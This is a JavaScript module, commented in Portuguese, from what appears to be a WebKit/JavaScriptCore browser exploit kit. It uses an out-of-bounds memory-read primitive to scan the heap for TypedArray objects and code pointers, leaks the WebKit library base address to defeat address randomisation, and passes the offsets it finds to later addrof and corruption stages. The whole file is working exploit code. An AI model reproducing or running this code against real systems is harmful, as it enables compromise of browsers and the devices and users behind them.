// js/victim_finder.mjs
import { AdvancedInt64 } from './int64.mjs';
import { log as appLog, PAUSE_LAB, toHexS1 } from './utils.mjs';
import * as Core from './core_exploit.mjs';
import { JSC_OFFSETS, OOB_CONFIG, WEBKIT_LIBRARY_INFO, updateOOBConfigFromUI } from './config.mjs';

const FNAME_BASE = "VictimFinder";

const TYPED_ARRAY_MODES = {
    0x00: "Int8Array", 0x01: "Int16Array", 0x02: "Int32Array", 0x03: "Uint8Array",
    0x04: "Uint8ClampedArray", 0x05: "Uint16Array", 0x06: "Uint32Array",
    0x07: "Float32Array", 0x08: "Float64Array", 0x09: "DataView",
};

let leakedWebKitBaseAddress = null;
let KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES = [];

export function setLeakedWebKitBaseAddress(baseAddrHex) {
    const FNAME_SET_BASE = `${FNAME_BASE}.setLeakedWebKitBaseAddress`;
    if (!baseAddrHex) {
        leakedWebKitBaseAddress = null;
        KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES = [];
        appLog(`Endereço base da WebKit LIMPO.`, "info", FNAME_SET_BASE);
        return;
    }
    try {
        leakedWebKitBaseAddress = new AdvancedInt64(baseAddrHex);
        appLog(`Endereço base da WebKit definido para: ${leakedWebKitBaseAddress.toString(true)}`, "good", FNAME_SET_BASE);
        
        KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES = (WEBKIT_LIBRARY_INFO.KNOWN_OFFSETS.VTable_Possible_Offsets || []).map(offsetHex =>
            leakedWebKitBaseAddress.add(AdvancedInt64.fromHex(offsetHex))
        );
        if (KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES.length > 0) {
            appLog(`VTables Absolutas Calculadas: ${KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES.map(a => a.toString(true)).join(', ')}`, 'info', FNAME_SET_BASE);
        } else {
            appLog(`Nenhum offset de VTable conhecido em WEBKIT_LIBRARY_INFO para calcular endereços absolutos.`, 'warn', FNAME_SET_BASE);
        }
    } catch (e) {
        appLog(`Erro ao definir endereço base da WebKit: ${e.message}`, "error", FNAME_SET_BASE);
        leakedWebKitBaseAddress = null;
        KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES = [];
    }
}

async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
    let vtable_ptr, m_mode_val, m_length_val, m_vector_ptr, m_buffer_ptr;

    try {
        const vtableReadOffset = currentCandidateBaseRelOffset + (JSC_OFFSETS.TypedArray.VTABLE_OFFSET || 0);
        vtable_ptr = Core.oob_read_relative(vtableReadOffset, 8);
        logFn(`DEBUG: scanForTypedArrays @ ${toHexS1(currentCandidateBaseRelOffset)}, vtable_ptr raw: ${String(vtable_ptr)}, typeof: ${typeof vtable_ptr}, instanceof AdvInt64: ${vtable_ptr instanceof AdvancedInt64}, has isNullPtr: ${!!(vtable_ptr && vtable_ptr.isNullPtr)}`, 'info', `${FNAME_BASE}.DebugTA`);
        if (vtable_ptr !== undefined && vtable_ptr !== null && !(vtable_ptr instanceof AdvancedInt64)) {
            throw new TypeError(`vtable_ptr não é AdvancedInt64. Tipo: ${typeof vtable_ptr}, Valor: ${String(vtable_ptr)}`);
        }

        let vtableMatch = false;
        if (leakedWebKitBaseAddress && KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES.length > 0) {
            for (const knownVTableAddr of KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES) {
                if (vtable_ptr && vtable_ptr.equals(knownVTableAddr)) {
                    vtableMatch = true;
                    break;
                }
            }
        }

        const modeReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.M_MODE_OFFSET;
        m_mode_val = Core.oob_read_relative(modeReadOffset, 1);

        const lengthReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.M_LENGTH_OFFSET;
        m_length_val = Core.oob_read_relative(lengthReadOffset, 4);

        const vectorReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET;
        m_vector_ptr = Core.oob_read_relative(vectorReadOffset, 8);
        logFn(`DEBUG: scanForTypedArrays @ ${toHexS1(currentCandidateBaseRelOffset)}, m_vector_ptr raw: ${String(m_vector_ptr)}, typeof: ${typeof m_vector_ptr}, instanceof AdvInt64: ${m_vector_ptr instanceof AdvancedInt64}, has isNullPtr: ${!!(m_vector_ptr && m_vector_ptr.isNullPtr)}`, 'info', `${FNAME_BASE}.DebugTA`);
        if (m_vector_ptr !== undefined && m_vector_ptr !== null && !(m_vector_ptr instanceof AdvancedInt64)) {
            throw new TypeError(`m_vector_ptr (lido de ${toHexS1(vectorReadOffset)}) não é AdvancedInt64. Tipo: ${typeof m_vector_ptr}, Valor: ${String(m_vector_ptr)}`);
        }

        const typeName = TYPED_ARRAY_MODES[m_mode_val] || null;
        const isLengthPlausible = typeof m_length_val === 'number' && m_length_val > 0 && m_length_val < (1024 * 1024 * 32);
        // Adiciona verificação explícita se m_vector_ptr é uma instância antes de chamar métodos
        const isVectorPlausible = m_vector_ptr && (m_vector_ptr instanceof AdvancedInt64) && !m_vector_ptr.isNullPtr() && !m_vector_ptr.isNegativeOne() && m_vector_ptr.greaterThanOrEqual(new AdvancedInt64(0x1000, 0));

        if (typeName && isLengthPlausible && isVectorPlausible) {
            const bufferPtrReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.ASSOCIATED_ARRAYBUFFER_OFFSET;
            m_buffer_ptr = Core.oob_read_relative(bufferPtrReadOffset, 8);
            logFn(`DEBUG: scanForTypedArrays @ ${toHexS1(currentCandidateBaseRelOffset)}, m_buffer_ptr raw: ${String(m_buffer_ptr)}, typeof: ${typeof m_buffer_ptr}, instanceof AdvInt64: ${m_buffer_ptr instanceof AdvancedInt64}, has isNullPtr: ${!!(m_buffer_ptr && m_buffer_ptr.isNullPtr)}`, 'info', `${FNAME_BASE}.DebugTA`);
            if (m_buffer_ptr !== undefined && m_buffer_ptr !== null && !(m_buffer_ptr instanceof AdvancedInt64)) {
                throw new TypeError(`m_buffer_ptr não é AdvancedInt64. Tipo: ${typeof m_buffer_ptr}, Valor: ${String(m_buffer_ptr)}`);
            }

            const isBufferPtrPlausible = m_buffer_ptr && (m_buffer_ptr instanceof AdvancedInt64) && !m_buffer_ptr.isNullPtr() && !m_buffer_ptr.isNegativeOne() && m_buffer_ptr.greaterThanOrEqual(new AdvancedInt64(0x1000, 0));

            if (isBufferPtrPlausible) {
                const candidate = {
                    type: "TypedArray",
                    gapOrRelativeOffset: currentCandidateBaseRelOffset,
                    m_mode: m_mode_val, typeName: typeName, m_length: m_length_val,
                    m_vector_hex: m_vector_ptr.toString(true),
                    m_buffer_hex: m_buffer_ptr.toString(true),
                    vtable_ptr_hex: vtable_ptr ? vtable_ptr.toString(true) : "N/A",
                    vtable_match: vtableMatch
                };
                return candidate;
            }
        }
    } catch (e) { 
        if (!(e instanceof RangeError && e.message.toLowerCase().includes("fora dos limites do buffer real"))) {
            logFn(`Erro informativo durante scanForTypedArrays em ${toHexS1(currentCandidateBaseRelOffset)}: ${e.name} - ${e.message}`, 'info', `${FNAME_BASE}.scanForTypedArrays`);
            // console.error(`StackTrace para erro em scanForTypedArrays (offset ${toHexS1(currentCandidateBaseRelOffset)}):`, e); // Para depuração mais profunda
        }
    }
    return null;
}

async function scanForCodePointers(currentCandidateBaseRelOffset, logFn) {
    let potentialPtr;
    try {
        potentialPtr = Core.oob_read_relative(currentCandidateBaseRelOffset, 8);
        logFn(`DEBUG: scanForCodePointers @ ${toHexS1(currentCandidateBaseRelOffset)}, potentialPtr raw: ${String(potentialPtr)}, typeof: ${typeof potentialPtr}, instanceof AdvInt64: ${potentialPtr instanceof AdvancedInt64}, has isNullPtr: ${!!(potentialPtr && potentialPtr.isNullPtr)}`, 'info', `${FNAME_BASE}.DebugCP`);
        if (potentialPtr !== undefined && potentialPtr !== null && !(potentialPtr instanceof AdvancedInt64)) {
            throw new TypeError(`potentialPtr (para CodePointer) não é AdvancedInt64. Tipo: ${typeof potentialPtr}`);
        }

        if (potentialPtr && (potentialPtr instanceof AdvancedInt64) && !potentialPtr.isNullPtr() && !potentialPtr.isNegativeOne()) {
            // ... (lógica de verificação de ponteiro de código como antes)
            if (leakedWebKitBaseAddress) {
                for (const segment of WEBKIT_LIBRARY_INFO.SEGMENTS) {
                    const segStart = leakedWebKitBaseAddress.add(AdvancedInt64.fromHex(segment.vaddr_start_hex));
                    const segEnd = segStart.add(AdvancedInt64.fromHex(segment.memsz_hex));
                    if (potentialPtr.greaterThanOrEqual(segStart) && potentialPtr.lessThan(segEnd)) {
                        for (const [funcName, funcOffsetHex] of Object.entries(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS)) {
                            const funcAbsoluteAddr = leakedWebKitBaseAddress.add(AdvancedInt64.fromHex(funcOffsetHex));
                            if (potentialPtr.equals(funcAbsoluteAddr)) {
                                return {
                                    type: "CodePointer (Exact Match)", gapOrRelativeOffset: currentCandidateBaseRelOffset,
                                    leakedPtrHex: potentialPtr.toString(true), knownFunction: funcName,
                                    libraryBaseHex: leakedWebKitBaseAddress.toString(true)
                                };
                            }
                        }
                        return {
                            type: "CodePointer (In-Segment)", gapOrRelativeOffset: currentCandidateBaseRelOffset,
                            leakedPtrHex: potentialPtr.toString(true), segmentName: segment.name,
                            libraryBaseHex: leakedWebKitBaseAddress.toString(true)
                        };
                    }
                }
            } else {
                for (const [funcName, funcOffsetHex] of Object.entries(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS)) {
                    const funcOffsetInt64 = AdvancedInt64.fromHex(funcOffsetHex);
                    const potentialBaseAddr = potentialPtr.sub(funcOffsetInt64);
                    if ((potentialBaseAddr.low() & 0xFFF) === 0 && potentialBaseAddr.greaterThanOrEqual(new AdvancedInt64(0x10000000,0))) {
                        return {
                            type: "CodePointer (Base Calculated)", gapOrRelativeOffset: currentCandidateBaseRelOffset,
                            leakedPtrHex: potentialPtr.toString(true), calculatedBaseHex: potentialBaseAddr.toString(true),
                            probableFunction: funcName, functionOffset: funcOffsetHex
                        };
                    }
                }
            }
        }
    } catch (e) {
        if (!(e instanceof RangeError && e.message.toLowerCase().includes("fora dos limites do buffer real"))) {
            logFn(`Erro informativo durante scanForCodePointers em ${toHexS1(currentCandidateBaseRelOffset)}: ${e.name} - ${e.message}`, 'info', `${FNAME_BASE}.scanForCodePointers`);
        }
    }
    return null;
}

export async function scanMemory(scanStartRelOffset, scanRangeBytes, stepBytes = 8, scanConfig = {typedArrays: true, codePointers: false}) {
    const FNAME_SCAN = `${FNAME_BASE}.scanMemory`;
    appLog(`--- Iniciando ${FNAME_SCAN} ---`, 'test', FNAME_SCAN);
    updateOOBConfigFromUI(); 
    
    if (!Core.oob_array_buffer_real || 
        OOB_CONFIG.ALLOCATION_SIZE !== Core.oob_dataview_real?.byteLength || 
        OOB_CONFIG.BASE_OFFSET_IN_DV !== Core.oob_dataview_real?.byteOffset) {
        appLog("   Configurações OOB ou buffer OOB parecem desatualizados/não ativos. Reativando primitiva OOB...", 'warn', FNAME_SCAN);
        await Core.triggerOOB_primitive(); 
        if (!Core.oob_array_buffer_real) {
            appLog("   ERRO: Primitiva OOB não pôde ser ativada/reativada. Varredura abortada.", 'error', FNAME_SCAN);
            return [];
        }
    }
    
    appLog(`   Usando Config OOB: AllocSize=${OOB_CONFIG.ALLOCATION_SIZE}, BaseOffsetDV=${OOB_CONFIG.BASE_OFFSET_IN_DV}, InitialBufSize=${OOB_CONFIG.INITIAL_BUFFER_SIZE}`, 'info', FNAME_SCAN);
    appLog(`   Buffer OOB Real Total: ${Core.oob_array_buffer_real.byteLength} bytes`, 'info', FNAME_SCAN);
    appLog(`   Configurações da varredura: Início Relativo=${toHexS1(scanStartRelOffset)}, Range=${scanRangeBytes} bytes, Passo=${stepBytes} bytes`, 'info', FNAME_SCAN);
    appLog(`   Tipos de Scan Ativos: TypedArrays=${scanConfig.typedArrays}, CodePointers=${scanConfig.codePointers}`, 'info', FNAME_SCAN);

    const candidates = [];
    const maxRelativeOffsetToScanUpTo = scanStartRelOffset + scanRangeBytes;

    const lastFieldStructureOffset = Math.max(
        JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET, JSC_OFFSETS.TypedArray.M_LENGTH_OFFSET,
        JSC_OFFSETS.TypedArray.M_MODE_OFFSET, JSC_OFFSETS.TypedArray.ASSOCIATED_ARRAYBUFFER_OFFSET,
        (JSC_OFFSETS.TypedArray.VTABLE_OFFSET || 0)
    ) + 8;
    const safeBaseCandidateLimitRelative = (Core.oob_array_buffer_real.byteLength - OOB_CONFIG.BASE_OFFSET_IN_DV) + OOB_CONFIG.INITIAL_BUFFER_SIZE - lastFieldStructureOffset;

    appLog(`   Scan irá até offset relativo (base do candidato): ${toHexS1(maxRelativeOffsetToScanUpTo)}`, 'info', FNAME_SCAN);
    appLog(`   Limite seguro para base do candidato (relativo): ${toHexS1(safeBaseCandidateLimitRelative)}`, 'info', FNAME_SCAN);

    for (let currentCandidateBaseRelOffset = scanStartRelOffset; currentCandidateBaseRelOffset < maxRelativeOffsetToScanUpTo; currentCandidateBaseRelOffset += stepBytes) {
        if (currentCandidateBaseRelOffset > safeBaseCandidateLimitRelative) {
            appLog(`   AVISO: Base candidata ${toHexS1(currentCandidateBaseRelOffset)} excedeu limite seguro de leitura ${toHexS1(safeBaseCandidateLimitRelative)}. Parando varredura.`, 'warn', FNAME_SCAN);
            break;
        }
        if (document.hidden) { appLog("Varredura abortada, página não visível.", "warn", FNAME_SCAN); break; }
        await PAUSE_LAB(1);

        let foundThisIteration = null;
        if (scanConfig.typedArrays) {
            const taCandidate = await scanForTypedArrays(currentCandidateBaseRelOffset, appLog);
            if (taCandidate) {
                candidates.push(taCandidate);
                foundThisIteration = taCandidate;
                 if (taCandidate.vtable_match) { // Log específico se VTable coincidir
                     appLog(`   CANDIDATO TYPEDARRAY (VTABLE MATCH!): GAP/OffsetRel: ${toHexS1(taCandidate.gapOrRelativeOffset)}, Tipo: ${taCandidate.typeName}, VTable: ${taCandidate.vtable_ptr_hex}`, 'good', FNAME_SCAN);
                } else { // Log geral para candidato TypedArray encontrado
                     appLog(`   Candidato TypedArray Encontrado: GAP/OffsetRel: ${toHexS1(taCandidate.gapOrRelativeOffset)}, Tipo: ${taCandidate.typeName}, VTable Lida: ${taCandidate.vtable_ptr_hex}`, 'leak', FNAME_SCAN);
                }
            }
        }
        if (scanConfig.codePointers && !foundThisIteration) {
            const cpCandidate = await scanForCodePointers(currentCandidateBaseRelOffset, appLog);
            if (cpCandidate) {
                candidates.push(cpCandidate);
                appLog(`   CANDIDATO PONTEIRO DE CÓDIGO: OffsetScan ${toHexS1(cpCandidate.gapOrRelativeOffset)}, Ptr: ${cpCandidate.leakedPtrHex}, BaseCalc: ${cpCandidate.calculatedBaseHex} (Função: ${cpCandidate.probableFunction || cpCandidate.knownFunction || cpCandidate.segmentName || 'N/A'})`, 'leak', FNAME_SCAN);
            }
        }
    }

    if (candidates.length > 0) {
        appLog(`   Varredura concluída. ${candidates.length} candidatos totais encontrados.`, 'good', FNAME_SCAN);
    } else {
        appLog(`   Varredura concluída. Nenhum candidato encontrado com os critérios atuais.`, 'warn', FNAME_SCAN);
    }
    appLog(`--- ${FNAME_SCAN} Concluído ---`, 'test', FNAME_SCAN);
    return candidates;
}

export async function findVictimButtonHandler() {
    const FNAME_HANDLER = `${FNAME_BASE}.Handler`;
    const scanRangeEl = document.getElementById('victimFinderScanRange');
    const scanStepEl = document.getElementById('victimFinderScanStep');
    const scanStartOffsetEl = document.getElementById('victimFinderScanStartOffset');
    
    let scanStartOffset;
    const scanRange = scanRangeEl ? parseInt(scanRangeEl.value, 10) : 30000;
    const scanStep = scanStepEl ? parseInt(scanStepEl.value, 10) : 8;

    try {
        const offsetStr = scanStartOffsetEl ? scanStartOffsetEl.value.trim() : "";
        if (offsetStr === "") { 
            scanStartOffset = Core.getInitialBufferSize();
            if (scanStartOffsetEl) scanStartOffsetEl.value = toHexS1(scanStartOffset);
        } else if (offsetStr.toLowerCase().startsWith("0x")) {
            scanStartOffset = parseInt(offsetStr, 16);
        } else {
            scanStartOffset = parseInt(offsetStr, 10);
        }
        if (isNaN(scanStartOffset) || scanStartOffset < 0) {
             scanStartOffset = Core.getInitialBufferSize(); 
             if(scanStartOffsetEl) scanStartOffsetEl.value = toHexS1(scanStartOffset);
             appLog(`Offset de início de varredura inválido, usando default: ${toHexS1(scanStartOffset)}`, "warn", FNAME_HANDLER);
        } else {
            if(scanStartOffsetEl) scanStartOffsetEl.value = toHexS1(scanStartOffset);
        }
    } catch (e) {
        scanStartOffset = Core.getInitialBufferSize(); 
        if(scanStartOffsetEl) scanStartOffsetEl.value = toHexS1(scanStartOffset);
        appLog(`Erro ao parsear offset inicial de varredura: ${e.message}. Usando default ${toHexS1(scanStartOffset)}`, "warn", FNAME_HANDLER);
    }

    const scanConfig = { typedArrays: true, codePointers: true };
    const candidates = await scanMemory(scanStartOffset, scanRange, scanStep, scanConfig);

    if (candidates.length > 0) {
        appLog("Candidatos Encontrados pelo Scanner:", "analysis", FNAME_HANDLER);
        let firstTypedArrayCandidate = null;
        candidates.forEach(c => {
            if (c.type === "TypedArray") {
                if (!firstTypedArrayCandidate) firstTypedArrayCandidate = c;
                appLog(`  - TypedArray: GAP/Offset: ${toHexS1(c.gapOrRelativeOffset)} | Tipo: ${c.typeName} (${toHexS1(c.m_mode,2)}) | Len: ${c.m_length} | Vec: ${c.m_vector_hex} | VTable: ${c.vtable_ptr_hex || 'N/Lida'} ${c.vtable_match ? '(MATCH!)' : ''}`, "analysis", FNAME_HANDLER);
            } else if (c.type && c.type.includes("CodePointer")) {
                appLog(`  - CodePointer: OffsetScan ${toHexS1(c.gapOrRelativeOffset)} | Ptr: ${c.leakedPtrHex} | BaseCalc: ${c.calculatedBaseHex} (Função: ${c.probableFunction || c.knownFunction || c.segmentName || 'N/A'})`, "leak", FNAME_HANDLER);
                if (c.calculatedBaseHex && !leakedWebKitBaseAddress) { // Auto-seta a base se uma for calculada e nenhuma estiver definida
                    const leakedWebKitBaseHexEl = document.getElementById('leakedWebKitBaseHex');
                    if (leakedWebKitBaseHexEl) leakedWebKitBaseHexEl.value = c.calculatedBaseHex;
                    setLeakedWebKitBaseAddress(c.calculatedBaseHex);
                }
            } else {
                appLog(`  - Candidato Desconhecido: ${JSON.stringify(c)}`, "warn", FNAME_HANDLER);
            }
        });

        const gapInputEl = document.getElementById('gap_to_test_input');
        const addrofGapEl = document.getElementById('addrofGap');
        if (firstTypedArrayCandidate) {
            const firstCandidateGap = firstTypedArrayCandidate.gapOrRelativeOffset;
            if (gapInputEl) {
                gapInputEl.value = firstCandidateGap;
                appLog(`   GAP/Offset do primeiro TypedArray (${toHexS1(firstCandidateGap)}) populado no input 'gap_to_test_input' como ${firstCandidateGap}.`, "info", FNAME_HANDLER);
            }
            if (addrofGapEl) {
                addrofGapEl.value = firstCandidateGap;
                 appLog(`   GAP/Offset do primeiro TypedArray (${toHexS1(firstCandidateGap)}) populado no input 'addrofGap' como ${firstCandidateGap}.`, "info", FNAME_HANDLER);
            }
        }
    } else {
        appLog("Nenhum candidato encontrado na varredura com os critérios atuais.", "warn", FNAME_HANDLER);
    }
}
